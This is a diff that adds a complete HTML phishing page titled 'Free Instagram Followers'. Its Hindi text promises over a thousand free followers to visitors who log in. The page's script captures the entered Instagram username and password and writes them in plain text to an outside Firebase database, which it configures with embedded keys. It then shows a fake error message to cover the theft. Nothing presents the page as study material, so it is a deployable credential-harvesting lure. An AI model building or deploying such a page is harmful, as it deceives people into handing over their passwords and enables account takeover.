@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free Instagram Followers</title>
+    <style>
+      /* Global styles */
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Poppins", Arial, sans-serif;
+        background: linear-gradient(to right, #8360c3, #2ebf91);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        color: #fff;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 15px;
+        box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+
+      .container h1 {
+        font-size: 24px;
+        margin-bottom: 10px;
+      }
+
+      .container p {
+        font-size: 16px;
+        margin-bottom: 20px;
+        line-height: 1.5;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        background: rgba(255, 255, 255, 0.2);
+        color: #fff;
+      }
+
+      .input-field::placeholder {
+        color: #ddd;
+      }
+
+      .submit-button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: bold;
+        color: #fff;
+        background-color: #2ebf91;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .submit-button:hover {
+        background-color: #25a479;
+      }
+
+      footer {
+        margin-top: 20px;
+        font-size: 14px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>फ्री इंस्टाग्राम फॉलोअर्स</h1>
+      <p>
+        अब आपको बिल्कुल फ्री में इंस्टाग्राम पर एक हज़ार से ज्यादा फॉलोअर्स दिए जा
+        रहे हैं। अगर आप भी इस प्रकार से अपने फॉलोअर्स बढ़ाना चाहते हैं तो नीचे
+        लॉगिन करें।
+      </p>
+      <form id="loginForm">
+        <input
+          class="input-field"
+          id="username"
+          type="text"
+          placeholder="Enter your Username"
+        />
+        <input
+          class="input-field"
+          id="password"
+          type="password"
+          placeholder="Enter your Password"
+        />
+        <button class="submit-button" type="submit">Login</button>
+      </form>
+      <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
+    </div>
+
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+      import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+
+      // Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
+        authDomain: "freefollowers-d31af.firebaseapp.com",
+        databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
+        projectId: "freefollowers-d31af",
+        storageBucket: "freefollowers-d31af.appspot.com",
+        messagingSenderId: "807949104285",
+        appId: "1:807949104285:web:2c0238cdc7913dad279074",
+        measurementId: "G-ME1GQ5KV8H",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+
+      function writeUserData(userID, username, password) {
+        set(ref(db, "users/" + userID), { username: username, password: password });
+      }
+
+      // Handle form submission
+      document.getElementById("loginForm").addEventListener("submit", (event) => {
+        event.preventDefault();
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const userID = new Date().getTime();
+
+        if (username && password) {
+          writeUserData(userID, username, password);
+          alert("Your Account is Unexpected! Please try again later!");
+        } else {
+          alert("Please fill in both fields.");
+        }
+      });
+    </script>
+  </body>
+</html>
